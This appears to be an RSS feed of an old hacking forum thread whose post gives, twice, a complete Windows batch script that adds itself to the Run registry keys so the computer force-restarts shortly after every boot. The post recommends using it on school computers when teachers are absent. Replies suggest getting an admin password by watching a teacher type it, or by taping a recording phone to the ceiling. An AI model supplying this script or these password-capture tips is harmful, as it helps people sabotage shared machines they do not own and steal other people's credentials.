channel.title: [Leet] Shutdown Computer Every Time It Is Booted Up
channel.description: Open Up NotePad And Type: [code]echo @echo off>c:\windows\hartlell.bat echo break off>>c:\windows\hartlell.bat echo shutdown -r -t 11 -f>>c:\windows\hartlell.bat echo end>>c:\windows\hartlell.bat reg add hkey_local_machine\software\microsoft\windows\currentversion\run /v startAPI /t reg_sz /d c:\windows\hartlell.bat /f reg add hkey_current_user\software\microsoft\windows\currentversion\run /v HAHAHA /t reg_sz /d c:\windows\hartlell.bat /f echo Undergroundkyng Strikes Again PAUSE [/code] Then Save As Anything.bat and run :D Best used at school when there is no teachers there

item.title: [Leet] Shutdown Computer Every Time It Is Booted Up
item.dc:creator: @Martin Martin
item.description:
@Martin wrote:

kmb:

[quote author=Mmmk link=topic=865.msg9124#msg9124 date=1144086382]
Go get on a admin account.
Easyest way is to just look at your teachers password while he/she is typing it in , on a diff lesson.
Then in the next it lesson use this while logging on the admin account

Meh, my teacher's comp is in the front of the class so there's no way anyone could see her typing it :f.[/quote]

celetape your phone to the cieling with a 1gb memory card and video on.... i have gained many passwords this way, saves writing a program to do it lol

Read full topic
item.source: [Leet] Shutdown Computer Every Time It Is Booted Up

item.title: [Leet] Shutdown Computer Every Time It Is Booted Up
item.dc:creator: @Mmmk Mmmk
item.description:
@Mmmk wrote:

Open Up NotePad And Type:

echo @echo off>c:\windows\hartlell.bat
echo break off>>c:\windows\hartlell.bat
echo shutdown -r -t 11 -f>>c:\windows\hartlell.bat
echo end>>c:\windows\hartlell.bat
reg add hkey_local_machine\software\microsoft\windows\currentversion\run /v startAPI /t reg_sz /d c:\windows\hartlell.bat /f
reg add hkey_current_user\software\microsoft\windows\currentversion\run /v HAHAHA /t reg_sz /d c:\windows\hartlell.bat /f
echo Undergroundkyng Strikes Again
PAUSE

Then Save As Anything.bat and run
Best used at school when there is no teachers there

Read full topic
item.source: [Leet] Shutdown Computer Every Time It Is Booted Up
